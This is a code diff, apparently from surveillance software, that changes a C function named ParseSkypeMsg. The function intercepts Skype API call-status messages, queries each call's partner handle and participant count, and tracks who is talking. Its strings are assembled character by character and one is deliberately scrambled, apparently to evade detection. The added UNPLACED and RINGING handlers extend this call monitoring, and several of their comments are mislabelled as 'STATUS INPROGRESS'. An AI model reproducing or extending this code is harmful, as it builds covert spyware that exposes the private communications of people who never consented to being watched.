@@ -2735,10 +2735,14 @@ BOOL ParseSkypeMsg(BYTE *msg, DWORD *pdwLen, DWORD *pdwFlags)
 	char id_local_hold[] = { 'S', 'T', 'A', 'T', 'U', 'S', ' ', 'L', 'O', 'C', 'A', 'L', 'H', 'O', 'L', 'D', 0x0 }; //"STATUS LOCALHOLD"
 	char id_remotehold[] = { 'S', 'T', 'A', 'T', 'U', 'S', ' ', 'R', 'E', 'M', 'O', 'T', 'E', 'H', 'O', 'L', 'D', 0x0 }; //"STATUS REMOTEHOLD"
 	char id_finished[] = { 'S', 'T', 'A', 'T', 'U', 'S', ' ', 'F', 'I', 'N', 'I', 'S', 'H', 'E', 'D', 0x0 }; //"STATUS FINISHED"
-	char id_inprogress[] = { 'S', 'T', 'A', 'T', 'U', 'S', ' ', 'I', 'N', 'P', 'R', 'O', 'G', 'R', 'E', 'S', 'S', 0x0 }; //"STATUS INPROGRESS"
-	char id_inprogress_format[] = { 'C', 'A', 'L', 'L', ' ', '%', 'd', ' ', 'S', 'T', 'A', 'T', 'U', 'S', ' ', 'I', 'N', 'P', 'R', 'O', 'G', 'R', 'E', 'S', 'S', 0x0 }; //"CALL %d STATUS INPROGRESS"
-	char id_partic_count[] = { 'C', 'O', 'N', 'F', '_', 'P', 'A', 'R', 'T', 'I', 'C', 'I', 'P', 'A', 'N', 'T', 'S', '_', 'C', 'O', 'U', 'N', 'T', 0x0 }; //"CONF_PARTICIPANTS_COUNT"
+	
+	char id_unplaced[] = { 'S', 'T', 'A', 'T', 'U', 'S', ' ', 'U', 'N', 'P', 'L', 'A', 'C', 'E', 'D', 0x0 }; //"STATUS INPROGRESS"
+	char id_unplaced_format[] = { 'C', 'A', 'L', 'L', ' ', '%', 'd', ' ', 'S', 'T', 'A', 'T', 'U', 'S', ' ', 'U', 'N', 'P', 'L', 'A', 'C', 'E', 'D', 0x0 }; //"CALL %d STATUS INPROGRESS"
 
+	char id_ringing[] = { 'S', 'T', 'A', 'T', 'U', 'S', ' ', 'R', 'I', 'N', 'G', 'I', 'N', 'G', 0x0 }; //"STATUS INPROGRESS"
+	char id_ringing_format[] = { 'C', 'A', 'L', 'L', ' ', '%', 'd', ' ', 'S', 'T', 'A', 'T', 'U', 'S', ' ', 'R', 'I', 'N', 'G', 'I', 'N', 'G', 0x0 }; //"CALL %d STATUS INPROGRESS"
+
+	char id_partic_count[] = { 'C', 'O', 'N', 'F', '_', 'P', 'A', 'R', 'T', 'I', 'C', 'I', 'P', 'A', 'N', 'T', 'S', '_', 'C', 'O', 'U', 'N', 'T', 0x0 }; //"CONF_PARTICIPANTS_COUNT"
 	char format_partner_handle[] = { '#', '1', '4', '1', '1', '3', '0', '0', '9', ' ', 'G', 'E', 'T', ' ', 'C', 'A', 'L', 'L', ' ', '%', 'd', ' ', 'P', 'A', 'R', 'T', 'N', 'E', 'R', '_', 'H', 'A', 'N', 'D', 'L', 'E', 0x0 }; //"#14113009 GET CALL %d PARTNER_HANDLE"
 	char format_conf_part[] = { 'G', 'E', 'T', ' ', 'C', 'A', 'L', 'L', ' ', '%', 'd', ' ', 'C', 'O', 'N', 'F', '_', 'P', 'A', 'R', 'T', 'I', 'C', 'I', 'P', 'A', 'N', 'T', 'S', '_', 'C', 'O', 'U', 'N', 'T', 0x0 }; //"GET CALL %d CONF_PARTICIPANTS_COUNT"
 	char format_call_stat[] = { 'C', 'A', 'L', 'L', ' ', '%', 'd', ' ', 'S', 'T', 'A', 'T', 'U', 'S', ' ', '%', 's', 0x0 }; //"CALL %d STATUS %s"
@@ -2747,8 +2751,10 @@ BOOL ParseSkypeMsg(BYTE *msg, DWORD *pdwLen, DWORD *pdwFlags)
 	char string_obfs[] = { '_', ' ', 'O', 'E', 'P', 'U', 'v', 'E', 't', 'U', 'P', 'C', ' ', 'X', 'Q', 'y', 'c', ' ', 'H', 'd', 'l', 'd', 'l', '1', '.', '.', '.', '.', '.', '.', '.', '.', '.', '.', '.', '.', '.', 'Q', 'M', 0x0d, 0x0a, 0x0}; // "_ OEPUvEtUPC XQyc Hdldl1.............QM\r\n"
 
 	if (*pdwFlags & FLAGS_SKAPI_MSG) {
+
 		NullTerminatePacket(*pdwLen, msg);
 		if (!strncmp((char *)msg, id_num, 9)) {
+
 			// Skype ha risposto alle nostre richieste dicendo chi e' l'interlocutore
 			// per questa chiamata
 			partner_entry *curr_partner;
@@ -2765,7 +2771,7 @@ BOOL ParseSkypeMsg(BYTE *msg, DWORD *pdwLen, DWORD *pdwFlags)
 					SAFE_FREE(partner_handle);
 					return TRUE;
 				}
-			
+
 			// Se nella lista c'e' un interlocutore non Skype, azzera la lista
 			for (curr_partner = call_list_head; curr_partner; curr_partner=curr_partner->next) 
 				if (curr_partner->voip_program != VOIP_SKYPE && curr_partner->voip_program != VOIP_SKWSA) {
@@ -2788,11 +2794,11 @@ BOOL ParseSkypeMsg(BYTE *msg, DWORD *pdwLen, DWORD *pdwFlags)
 			curr_partner->flags = 0;
 			curr_partner->voip_program = VOIP_SKYPE;
 			call_list_head = curr_partner;
-		} else if (strstr((char *)msg, id_inprogress) && skype_api_wnd) {
+		} else if (strstr((char *)msg, id_unplaced) && skype_api_wnd) {
 			DWORD dummy;
-			
+
 			// Riceve l'avviso di chiamata in progress e richiede chi e' l'interlocutore
-			sscanf((char *)msg, id_inprogress_format, &call_id);
+			sscanf((char *)msg, id_unplaced_format, &call_id);
 			sprintf(req_buf, format_partner_handle, call_id);
 			cd_struct.dwData = 0;
 			cd_struct.lpData = req_buf;
@@ -2804,6 +2810,32 @@ BOOL ParseSkypeMsg(BYTE *msg, DWORD *pdwLen, DWORD *pdwFlags)
 			cd_struct.lpData = req_buf;
 			cd_struct.cbData = strlen((char *)cd_struct.lpData)+1;
 			HM_SafeSendMessageTimeoutW(skype_api_wnd, WM_COPYDATA, (WPARAM)skype_pm_wnd, (LPARAM)&cd_struct, SMTO_NORMAL, 0, &dummy);
+
+			// Termina ogni chiamata esistente 
+			EndCall();
+			FreePartnerList(&call_list_head);
+
+		} else if (strstr((char *)msg, id_ringing) && skype_api_wnd) {
+			DWORD dummy;
+
+			// Riceve l'avviso di chiamata in progress e richiede chi e' l'interlocutore
+			sscanf((char *)msg, id_ringing_format, &call_id);
+			sprintf(req_buf, format_partner_handle, call_id);
+			cd_struct.dwData = 0;
+			cd_struct.lpData = req_buf;
+			cd_struct.cbData = strlen((char *)cd_struct.lpData)+1;
+			HM_SafeSendMessageTimeoutW(skype_api_wnd, WM_COPYDATA, (WPARAM)skype_pm_wnd, (LPARAM)&cd_struct, SMTO_NORMAL, 0, &dummy);
+			// e chiede anche quanti sono a partecipare alla chiamata (in remoto)
+			sprintf(req_buf, format_conf_part, call_id);
+			cd_struct.dwData = 0;
+			cd_struct.lpData = req_buf;
+			cd_struct.cbData = strlen((char *)cd_struct.lpData)+1;
+			HM_SafeSendMessageTimeoutW(skype_api_wnd, WM_COPYDATA, (WPARAM)skype_pm_wnd, (LPARAM)&cd_struct, SMTO_NORMAL, 0, &dummy);
+
+			// Termina ogni chiamata esistente 
+			EndCall();
+			FreePartnerList(&call_list_head);
+
 		} else if (strstr((char *)msg, id_local_hold) || strstr((char *)msg, id_remotehold) || strstr((char *)msg, id_finished)) {
 			// Una chiamata e' stata terminata o messa in attesa
 			partner_entry **curr_partner, *tmp_partner;
@@ -2822,6 +2854,7 @@ BOOL ParseSkypeMsg(BYTE *msg, DWORD *pdwLen, DWORD *pdwFlags)
 				}
 		} else if (strstr((char *)msg, id_partic_count)) {
 			// Skype ci ha risposto dicendo quante persone stanno partecipando a una chiamata (da remoto)
+			
 			DWORD participant_count;
 			partner_entry *curr_partner;
 			sscanf((char *)msg, format_call_part, &call_id, &participant_count);
